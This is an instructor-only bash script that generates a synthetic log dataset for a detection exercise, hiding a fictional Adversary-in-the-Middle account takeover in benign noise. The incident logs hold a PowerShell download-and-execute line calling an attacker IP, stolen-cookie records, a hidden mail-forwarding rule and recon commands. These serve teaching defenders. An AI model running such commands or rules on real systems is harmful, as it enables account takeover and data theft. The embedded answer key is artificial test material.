#!/usr/bin/env bash
# =============================================================================
# datagen/generate.sh  (INSTRUCTOR-ONLY, pure bash)
# =============================================================================
# Synthesizes the fictional AiTM dataset: a ~2-week benign baseline plus one
# buried Adversary-in-the-Middle incident. 100% synthetic — no real tenant,
# no cloud, no secrets. Fictional company "Northwind Trading".
#
# Output (NDJSON + one text access log), written to datagen/output/:
#   entra_signin.json   - Entra-style sign-in logs
#   m365_mailbox.json   - M365 mailbox audit activity
#   endpoint.json       - post-ATO endpoint process events
#   evilginx.log        - reverse-proxy (text) access log
#
# All four share ONE field schema with custom-rules/ so detections match.
# =============================================================================
set -euo pipefail

OUT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/output"
mkdir -p "$OUT"
: > "$OUT/entra_signin.json"
: > "$OUT/m365_mailbox.json"
: > "$OUT/endpoint.json"
: > "$OUT/evilginx.log"

# ---- dataset size (medium = more noise to dig through) ----------------------
N_SIGNIN=${N_SIGNIN:-35000}
N_MAILBOX=${N_MAILBOX:-9000}
N_ENDPOINT=${N_ENDPOINT:-5000}
N_PORTAL_BENIGN=${N_PORTAL_BENIGN:-400}

# ---- fictional environment --------------------------------------------------
DOMAIN="northwind-trading.com"
USERS=(j.rivera a.kowalski m.chen s.okafor l.ferreira d.nguyen r.patel k.andersson t.morales b.haddad
       p.oconnor e.volkov n.sharma g.rossi h.yamamoto c.dubois w.novak f.ibrahim o.lindqvist v.costa)
CITIES_US=("Austin:US" "Seattle:US" "Denver:US" "Chicago:US" "Boston:US")
CITIES_EU=("Dublin:IE" "Munich:DE" "Lisbon:PT")
NORMAL_IPS=("198.51.100" "192.0.2" "203.0.113")  # benign /24 blocks (TEST-NET)
ANON_IP="203.0.113.45"                            # the attacker's VPN/anonymizer IP
VICTIM="j.rivera"
ATTACKER_FWD="exfil-collector@mailsec-proxy.ru"
DAYS=(01 02 03 04 05 06 07 08 09 10 11 12 13 14) # 2025-04-01 .. 2025-04-14
MONTH="2025-04"

rand_user()  { echo "${USERS[$((RANDOM % ${#USERS[@]}))]}"; }
rand_day()   { echo "${DAYS[$((RANDOM % ${#DAYS[@]}))]}"; }
pad()        { printf "%02d" "$1"; }
rand_ts() { # random benign timestamp inside the window
  printf "%sT%s:%s:%sZ" "$MONTH-$(rand_day)" "$(pad $((RANDOM%24)))" "$(pad $((RANDOM%60)))" "$(pad $((RANDOM%60)))"
}
rand_sid()  { printf "sess-%04x-%04x-%04x" "$RANDOM" "$RANDOM" "$RANDOM"; }
rand_ip()   { local b=${NORMAL_IPS[$((RANDOM%${#NORMAL_IPS[@]}))]}; echo "$b.$((RANDOM%254+1))"; }

echo "[datagen] generating benign baseline (this is pure bash, ~30-60s)..."

# ---- 1. benign Entra sign-ins ----------------------------------------------
{
for ((i=0; i<N_SIGNIN; i++)); do
  u=$(rand_user)
  if ((RANDOM % 2)); then loc=${CITIES_US[$((RANDOM%${#CITIES_US[@]}))]}; else loc=${CITIES_EU[$((RANDOM%${#CITIES_EU[@]}))]}; fi
  city=${loc%%:*}; country=${loc##*:}
  if ((RANDOM % 12 == 0)); then res="failure"; mfa="none"; else res="success"; mfa="satisfiedByPrompt"; fi
  printf '{"log_source":"entra_signin","timestamp":"%s","log_event":"SignInLogs","user":"%s","upn":"%s@%s","src_ip":"%s","geo_city":"%s","geo_country":"%s","app":"Office 365","client_app":"Browser","auth_method":"MFA","mfa_result":"%s","mfa_prompted":true,"session_id":"%s","session_reuse":false,"impossible_travel":false,"anonymizer":false,"risk_level":"low","result":"%s"}\n' \
    "$(rand_ts)" "$u" "$u" "$DOMAIN" "$(rand_ip)" "$city" "$country" "$mfa" "$(rand_sid)" "$res"
done
} >> "$OUT/entra_signin.json"

# ---- 2. benign mailbox activity --------------------------------------------
{
MAILOPS=(MailItemsAccessed Send MoveToDeletedItems UpdateCalendarDelegation Create)
for ((i=0; i<N_MAILBOX; i++)); do
  u=$(rand_user); op=${MAILOPS[$((RANDOM%${#MAILOPS[@]}))]}
  printf '{"log_source":"m365_mailbox","timestamp":"%s","log_event":"%s","user":"%s@%s","operation":"%s","client_ip":"%s","rule_name":"","forward_to":"","hidden":false,"result":"Success"}\n' \
    "$(rand_ts)" "$op" "$u" "$DOMAIN" "$op" "$(rand_ip)"
done
} >> "$OUT/m365_mailbox.json"

# ---- 3. benign endpoint events ---------------------------------------------
{
PROCS=("chrome.exe" "outlook.exe" "teams.exe" "explorer.exe" "code.exe" "excel.exe")
HOSTS=("WS-FIN-07" "WS-ENG-12" "WS-HR-03" "WS-SALES-21" "LT-RIVERA-01")
for ((i=0; i<N_ENDPOINT; i++)); do
  u=$(rand_user); p=${PROCS[$((RANDOM%${#PROCS[@]}))]}; h=${HOSTS[$((RANDOM%${#HOSTS[@]}))]}
  printf '{"log_source":"endpoint","timestamp":"%s","log_event":"process","host":"%s","user":"%s@%s","process":"%s","command_line":"%s","parent":"explorer.exe","technique":""}\n' \
    "$(rand_ts)" "$h" "$u" "$DOMAIN" "$p" "$p"
done
} >> "$OUT/endpoint.json"

# ---- 4. benign portal hits (legit logins to the real portal) ---------------
{
for ((i=0; i<N_PORTAL_BENIGN; i++)); do
  u=$(rand_user)
  printf 'evilginx: ts=%s src=%s method=GET uri=/ status=200 portal=login.%s user=%s@%s creds=0 cookie=none ua="Mozilla/5.0 (Windows NT 10.0)"\n' \
    "$(rand_ts)" "$(rand_ip)" "$DOMAIN" "$u" "$DOMAIN"
done
} >> "$OUT/evilginx.log"

echo "[datagen] injecting the AiTM incident (victim: ${VICTIM}@${DOMAIN}, ${MONTH}-14)..."

# =============================================================================
# THE BURIED AiTM INCIDENT — all on 2025-04-14
# =============================================================================
D="$MONTH-14"

# 4a. Victim lands on lookalike reverse-proxy portal; creds + cookie stolen
{
printf 'evilginx: ts=%sT09:08:55Z src=%s method=GET uri=/common/oauth2 status=200 portal=login.%s.secure-access.io user=%s@%s creds=0 cookie=none ua="Mozilla/5.0 (Windows NT 10.0)"\n' \
  "$D" "$ANON_IP" "$DOMAIN" "$VICTIM" "$DOMAIN"
printf 'evilginx: ts=%sT09:10:02Z src=%s method=POST uri=/login status=302 portal=login.%s.secure-access.io user=%s@%s creds=1 cookie=ESTSAUTH_captured_%s ua="Mozilla/5.0 (Windows NT 10.0)"\n' \
  "$D" "$ANON_IP" "$DOMAIN" "$VICTIM" "$DOMAIN" "$(rand_sid)"
} >> "$OUT/evilginx.log"

# 4b. Attacker replays the stolen session cookie -> MFA satisfied WITHOUT prompt.
#     Repeated 3x (fires correlation rule 100151) + impossible travel + reuse.
STOLEN_SID="sess-stolen-aitm-0001"
{
for t in "09:12:33" "09:41:07" "10:03:48"; do
printf '{"log_source":"entra_signin","timestamp":"%sT%sZ","log_event":"SignInLogs","user":"%s","upn":"%s@%s","src_ip":"%s","geo_city":"Kyiv","geo_country":"UA","app":"Office 365","client_app":"Browser","auth_method":"PreviouslySatisfied","mfa_result":"satisfiedByToken","mfa_prompted":false,"session_id":"%s","session_reuse":true,"impossible_travel":true,"anonymizer":true,"risk_level":"high","result":"success"}\n' \
  "$D" "$t" "$VICTIM" "$VICTIM" "$DOMAIN" "$ANON_IP" "$STOLEN_SID"
done
} >> "$OUT/entra_signin.json"

# 4c. Mailbox persistence: hidden inbox-rule + external forwarding
{
printf '{"log_source":"m365_mailbox","timestamp":"%sT09:30:11Z","log_event":"New-InboxRule","user":"%s@%s","operation":"New-InboxRule","client_ip":"%s","rule_name":".","forward_to":"%s","hidden":true,"result":"Success"}\n' \
  "$D" "$VICTIM" "$DOMAIN" "$ANON_IP" "$ATTACKER_FWD"
printf '{"log_source":"m365_mailbox","timestamp":"%sT09:31:02Z","log_event":"Set-Mailbox","user":"%s@%s","operation":"Set-Mailbox","client_ip":"%s","rule_name":"","forward_to":"%s","hidden":true,"result":"Success"}\n' \
  "$D" "$VICTIM" "$DOMAIN" "$ANON_IP" "$ATTACKER_FWD"
} >> "$OUT/m365_mailbox.json"

# 4d. Post-ATO recon + lateral movement (suspicious PowerShell)
{
printf '{"log_source":"endpoint","timestamp":"%sT10:00:14Z","log_event":"directory_recon","host":"LT-RIVERA-01","user":"%s@%s","process":"powershell.exe","command_line":"Get-AzureADUser -All $true | Export-Csv users.csv","parent":"explorer.exe","technique":"T1087"}\n' \
  "$D" "$VICTIM" "$DOMAIN"
printf '{"log_source":"endpoint","timestamp":"%sT10:05:39Z","log_event":"powershell","host":"LT-RIVERA-01","user":"%s@%s","process":"powershell.exe","command_line":"IEX (New-Object Net.WebClient).DownloadString(\\"http://203.0.113.45/r.ps1\\")","parent":"outlook.exe","technique":"T1059.001"}\n' \
  "$D" "$VICTIM" "$DOMAIN"
printf '{"log_source":"endpoint","timestamp":"%sT10:11:27Z","log_event":"powershell","host":"WS-FIN-07","user":"%s@%s","process":"powershell.exe","command_line":"Invoke-Command -ComputerName WS-FIN-07 -ScriptBlock { whoami }","parent":"powershell.exe","technique":"T1059.001"}\n' \
  "$D" "$VICTIM" "$DOMAIN"
} >> "$OUT/endpoint.json"

TOTAL=$(cat "$OUT"/entra_signin.json "$OUT"/m365_mailbox.json "$OUT"/endpoint.json "$OUT"/evilginx.log | wc -l)
echo "[datagen] done. ~${TOTAL} events written to $OUT/"
echo "[datagen] incident date: ${D}  victim: ${VICTIM}@${DOMAIN}"
